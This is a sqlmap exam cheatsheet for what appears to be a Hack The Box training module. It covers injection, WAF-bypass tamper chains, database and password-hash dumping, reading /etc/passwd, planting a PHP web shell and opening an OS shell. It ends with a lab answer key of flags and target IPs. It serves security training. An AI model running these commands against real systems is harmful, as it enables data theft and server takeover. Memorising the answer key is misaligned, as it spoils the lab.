# SQLMap Essentials — Exam Cheatsheet

---

## Basic Workflow

```bash
# GET parameter
sqlmap -u "http://TARGET/?id=1" --batch

# POST body
sqlmap -u "http://TARGET/" --data="id=1&name=x" --batch

# JSON body
sqlmap -u "http://TARGET/" --data='{"id":1}' --batch

# Cookie
sqlmap -u "http://TARGET/" --cookie="id=1" --level=2

# Full HTTP request from Burp
sqlmap -r req.txt --batch

# Mark injection point with *
--data="id=1*&name=x"     # only test id
```

---

## Speed Optimization

```bash
--dbms=mysql              # skip other-DBMS payloads
--technique=U             # UNION only (fastest)
--technique=BEU           # boolean, error, union
--batch                   # no prompts
--no-cast                 # fix silent UNION failures
--threads=10              # parallelize blind retrieval
```

---

## Boundary / Tuning

```bash
# Non-standard query wrappers
--prefix="`)" --suffix="-- -"      # backtick + paren wrap
--prefix="%'))" --suffix="-- -"    # LIKE with double parens

# Tests deeper boundary set
--level=2..5
--risk=2..3                # enables OR / stacked payloads

# UNION tuning
--union-cols=N             # force column count
--union-char='a'           # replace NULL filler
--union-from=table         # required for Oracle
```

---

## Bypass Quick Reference

| Protection | Flag |
|-----------|------|
| Anti-CSRF token | `--csrf-token="t0ken"` |
| Unique nonce | `--randomize=uid` |
| Calculated param | `--eval="..."` |
| Default UA blocklist | `--random-agent` |
| `>`, `<` filter | `--tamper=between` |
| Space filter | `--tamper=space2comment` or `space2plus` |
| Keyword blocklist | `--tamper=randomcase`, `versionedkeywords` |
| Cached failed detection | `--flush-session` |

```bash
# Chain tampers
--tamper=between,space2comment,randomcase
sqlmap --list-tampers              # list all tampers
```

---

## Enumeration

```bash
# Initial fingerprint
sqlmap -u "TARGET" --banner --current-user --current-db --is-dba

# Schema
sqlmap -u "TARGET" --dbs                     # all databases
sqlmap -u "TARGET" --tables -D <db>          # tables in db
sqlmap -u "TARGET" --columns -T <tbl> -D <db>
sqlmap -u "TARGET" --schema --exclude-sysdbs # full schema, skip system DBs

# Search
sqlmap -u "TARGET" --search -T user          # tables matching 'user'
sqlmap -u "TARGET" --search -C pass          # columns matching 'pass'

# Dump
sqlmap -u "TARGET" --dump -T users -D testdb
sqlmap -u "TARGET" --dump -T users -D testdb -C name,password
sqlmap -u "TARGET" --dump -T users -D testdb --where="name LIKE 'K%'"
sqlmap -u "TARGET" --dump -T users -D testdb --start=2 --stop=10
sqlmap -u "TARGET" --dump-all --exclude-sysdbs

# DB user hashes (auto-crack offered)
sqlmap -u "TARGET" --passwords --batch
```

---

## OS Exploitation

```bash
# Check DBA first
sqlmap -u "TARGET" --is-dba

# Read file
sqlmap -u "TARGET" --file-read="/etc/passwd"
sqlmap -u "TARGET" --file-read="/var/www/html/flag.txt"

# Write file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "TARGET" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Interactive shell (error-based works best)
sqlmap -u "TARGET" --os-shell --technique=E --batch

# One-shot command
sqlmap -u "TARGET" --os-cmd="id" --technique=E

# Full exploit (with Metasploit)
sqlmap -u "TARGET" --os-pwn
```

---

## Debugging

```bash
--parse-errors             # print DBMS errors inline
-t traffic.txt             # log all HTTP traffic to file
-v 3                       # show each payload
-v 6                       # full request+response stream
--proxy="http://127.0.0.1:8080"   # route through Burp
```

---

## Tamper Scripts — Full Reference

`--list-tampers` shows all; below are the most useful by category.

### WAF / character filter bypass
| Script | What it does |
|--------|--------------|
| `between` | `>` → `NOT BETWEEN 0 AND #`; `=` → `BETWEEN # AND #`. Bypass `<`/`>` filters |
| `equaltolike` | `=` → `LIKE` |
| `space2comment` | space → `/**/` (MySQL inline comment) |
| `space2plus` | space → `+` (URL-encoded space) |
| `space2randomblank` | space → random valid whitespace (tab, newline, etc.) |
| `space2dash` | space → `-- random\n` (single-line comment + newline) |
| `space2hash` | space → `# random\n` (MySQL hash comment) |
| `space2mssqlblank` | space → random whitespace (MSSQL-specific) |
| `percentage` | `SELECT` → `%S%E%L%E%C%T` (ASP/ASP.NET URL processor strips %) |
| `apostrophenullencode` | `'` → `%00%27` (null byte prefix) |
| `apostrophemask` | `'` → `%EF%BC%87` (Unicode fullwidth apostrophe) |
| `charunicodeencode` | URL-encode non-ASCII to unicode escape |
| `charencode` | URL-encode all chars (basic obfuscation) |

### Keyword obfuscation
| Script | What it does |
|--------|--------------|
| `randomcase` | `SELECT` → `SeLeCt` |
| `lowercase` | force lowercase keywords |
| `uppercase` | force uppercase keywords |
| `versionedkeywords` | `SELECT` → `/*!SELECT*/` (MySQL versioned comment) |
| `versionedmorekeywords` | wraps ALL keywords with versioned comments |
| `halfversionedmorekeywords` | versioned comment before each keyword (MySQL < 5.1) |
| `modsecurityversioned` | wraps entire query in versioned comment |
| `modsecurityzeroversioned` | `/*!00000` zero-version variant |
| `0eunion` | `UNION` → `e0UNION` (numeric type confusion) |
| `bluecoat` | replaces `AND` → `%26%26`, `=` → ` LIKE ` (Bluecoat WAF) |
| `concat2concatws` | `CONCAT(a,b)` → `CONCAT_WS(MID(CHAR(0),0,0),a,b)` |

### Backend transformations
| Script | What it does |
|--------|--------------|
| `appendnullbyte` | append `%00` to payload (PHP CGI) |
| `base64encode` | base64-encode the entire payload |
| `chardoubleencode` | URL-encode twice (some WAFs decode once) |
| `commalesslimit` | `LIMIT M,N` → `LIMIT N OFFSET M` (MySQL — comma filter bypass) |
| `commalessmid` | `MID(x,1,1)` → `MID(x FROM 1 FOR 1)` |
| `escapequotes` | `\'` and `\"` (escape with backslash) |
| `ifnull2ifisnull` | `IFNULL(a,b)` → `IF(ISNULL(a),b,a)` |
| `plus2concat` | `+` → `CONCAT()` (MSSQL) |
| `plus2fnconcat` | `+` → `{fn CONCAT()}` (ODBC) |
| `unionalltounion` | `UNION ALL` → `UNION` (smaller request) |

### Common chains

```bash
# WAF + character filter (most common combo):
--tamper=between,space2comment,randomcase

# Strict alpha-only filter:
--tamper=between,equaltolike,space2comment

# ASP.NET URL parser bypass:
--tamper=percentage,randomcase

# MySQL with versioned comments (some WAFs miss these):
--tamper=versionedkeywords,space2comment

# Cloudflare default rules:
--tamper=between,charunicodeencode,space2comment,randomcase
```

---

## Per-DBMS Quirks

### MySQL
```bash
--prefix="`"  --suffix="`-- -"     # backtick column-name context
--prefix="')) " --suffix="-- -"    # LIKE with double parens
--tamper=between,space2comment      # most common WAF combo
--technique=E                       # error-based EXTRACTVALUE/UPDATEXML
```

### MSSQL
```bash
--dbms=mssql --technique=ES         # error + stacked
--tamper=plus2concat,space2mssqlblank
--os-shell                          # xp_cmdshell — sqlmap enables it automatically if sysadmin
```

### PostgreSQL
```bash
--dbms=postgresql --technique=ES
--os-shell                          # COPY FROM PROGRAM — needs superuser
```

### Oracle
```bash
--dbms=oracle --technique=BT        # blind boolean + time (no stacked, no UNION FROM-less)
--union-from=DUAL                   # required FROM clause
```

### NoSQL (limited)
sqlmap doesn't natively handle MongoDB — use `nosqlmap` instead:
```bash
git clone https://github.com/codingo/NoSQLMap.git && cd NoSQLMap && python3 nosqlmap.py
```

---

## Second-Order SQLi
```bash
# Stored value triggered by a different URL — sqlmap supports this directly:
sqlmap -u "http://TARGET/register" --data="user=test*&pass=x" \
       --second-url="http://TARGET/profile/test"
# The * marks the injection point in the FIRST URL; --second-url is where the stored value is retrieved
```

---

## Custom Injection Points

When the parameter is in a non-standard location (HTTP header, complex JSON, etc.):

```bash
# Mark the injection point with *
sqlmap -u "http://TARGET/api" --data='{"user":"test*","other":"x"}' -p user
sqlmap -u "http://TARGET/" --cookie="id=1*; other=x"
sqlmap -u "http://TARGET/" -H "X-User: test*" --level=5
sqlmap -r request.txt --batch                       # mark * in the saved request file

# Force a specific testable param (when sqlmap auto-test misses):
sqlmap -u "http://TARGET/?id=1&other=2" -p id
```

---

## Lab Answers — All Cases (Target: `154.57.164.72:30732`)

| Case | Type | Key Flags | Flag Value |
|------|------|-----------|------------|
| 1 | GET param `id` | `--no-cast --technique=U` | `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}` |
| 2 | POST param `id` | `--data="id=1" -p id --technique=U` | `HTB{700_much_c0n6r475_0n_p057_r3qu357}` |
| 3 | Cookie `id` | `--cookie="id=1" --level=2` | `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}` |
| 4 | JSON body | `--data='{"id":1}' --no-cast` | `HTB{j450n_v00rh335_53nd5_6r475}` |
| 5 | OR SQLi | `--risk=3 --technique=BEU` | `HTB{700_much_r15k_bu7_w0r7h_17}` |
| 6 | Non-standard boundary | `--prefix='`)' --suffix='-- -' --level=4 --no-cast` | `HTB{v1nc3_mcm4h0n_15_4570n15h3d}` |
| 7 | UNION adjustments | `--technique=U --union-cols=5 --no-cast` | `HTB{un173_7h3_un173d}` |
| 8 | CSRF `t0ken` | `--csrf-token="t0ken"` | `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}` |
| 9 | Unique `uid` | `--randomize=uid` | `HTB{700_much_r4nd0mn355_f0r_my_74573}` |
| 10 | UA filter | `--random-agent` | `HTB{y37_4n07h3r_r4nd0m1z3}` |
| 11 | `<`,`>` filter | `--tamper=between --flush-session` | `HTB{5p3c14l_ch4r5_n0_m0r3}` |

### OS Exploitation Target (`154.57.164.71:32133`)

| Q | Command | Flag |
|---|---------|------|
| 1 | `--file-read="/var/www/html/flag.txt"` | `HTB{5up3r_u53r5_4r3_p0w3rful!}` |
| 2 | `--os-shell --technique=E` → `cat /flag.txt` | `HTB{n3v3r_run_db_45_db4}` |

### Skills Assessment (`154.57.164.78:31836`)

```bash
sqlmap -u "http://TARGET/action.php" --data='{"id":1}' \
  --tamper=between --random-agent --batch --flush-session \
  --dump -T final_flag -D production
```

**Flag:** `HTB{n07_50_h4rd_r16h7?!}`

---

## Decision Tree When Stuck

```
Not injectable?
  → Check --random-agent (UA blocked)
  → Check filter: probe chars manually with curl
  → Match filter to tamper (between, space2comment, randomcase)
  → --flush-session after fixing
  → Bump --level=3, --risk=2

UNION found but no output?
  → --no-cast (most common fix)
  → --union-char='a' (NULL filtered)
  → --hex (data with quotes/newlines)

Cookie not tested?
  → --level=2 minimum

OR payloads needed?
  → --risk=3

Time-based too slow?
  → Try --technique=BEU first
  → --threads=10 for blind

DBA confirmed but file read fails?
  → Check secure_file_priv with --sql-query
  → Try --hex on the file content
```
